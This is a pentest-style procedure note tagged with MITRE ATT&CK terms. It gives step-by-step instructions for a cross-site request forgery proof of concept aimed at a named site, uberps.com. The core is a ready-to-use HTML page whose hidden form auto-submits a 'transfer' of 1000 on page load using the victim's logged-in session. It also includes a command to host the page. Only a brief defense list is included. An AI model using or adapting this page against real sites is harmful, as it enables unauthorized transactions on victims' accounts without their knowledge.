---
id: p2b3c4d5-e6f7-8901-bcde-f2345678901
tags:
  - csrf
  - poc
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:42.357Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-CSRF-PoC

## Summary

This procedure creates a proof-of-concept HTML page that forges a request to a vulnerable CSRF form on uberps.com, auto-submitting sensitive data using the victim's session.

## Description

Once vulnerable forms are identified, craft a malicious page mimicking the form submission. For uberps.com, this targets unprotected POST endpoints for actions like transactions. The PoC uses JavaScript to submit without user interaction. Prerequisites: Knowledge of the target form's params and a local server for hosting. Outcomes: A working exploit page demonstrating unauthorized actions.

## Requirements

1. Text editor for HTML/JS
2. Local web server to host the PoC
3. Details of vulnerable form (action URL, params)

## Defense

Defensive measures and detection strategies:

- Enforce CSRF token validation on all state-changing requests
- Set strict referrer policies
- Log and alert on cross-origin form submissions

## Objectives

1. Forge a request matching the vulnerable form
2. Auto-submit to bypass user awareness
3. Verify exploitation in a test environment

## Instructions

### Step 1: Write the PoC HTML

**Context**: Create an HTML file with a hidden form targeting the uberps.com endpoint.

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body onload="document.getElementById('exploitForm').submit()">
    <form id="exploitForm" action="https://uberps.com/vulnerable-form" method="POST">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="action" value="transfer">
    </form>
</body>
</html>
```

> Save as csrf-poc.html. The onload auto-submits when loaded.

### Step 2: Host and Test PoC

**Context**: Serve the file locally and load it in a browser logged into uberps.com.

Start a server:

```bash
python3 -m http.server 8000
```

Visit http://localhost:8000/csrf-poc.html and check uberps.com for the action.

**Expected Output**: Unauthorized action executed on target site.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[exploit-poc]]
